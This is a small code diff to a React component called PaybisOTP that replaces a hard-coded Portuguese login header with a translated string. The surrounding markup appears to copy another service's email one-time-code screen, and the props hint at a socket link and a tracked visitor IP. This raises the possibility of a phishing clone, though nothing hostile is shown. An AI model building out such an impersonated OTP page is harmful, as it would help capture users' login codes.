@@ -106,7 +106,7 @@ export default function PaybisOTP({ socket, ip,setCenaAtual }) {
       <div className="auth-wrapper__body">
      
           <div className="email-otp" country-code="BR">
-            <div className="auth-app-header">Entrar</div>
+            <div className="auth-app-header">{t('Login')}</div>
             <img src={envelope} alt="" className="email-otp__icon " />
             <i data-v-198035f7="" class="icon icon-envelope-auth email-otp__icon"></i>
             <p className="sent-notice">
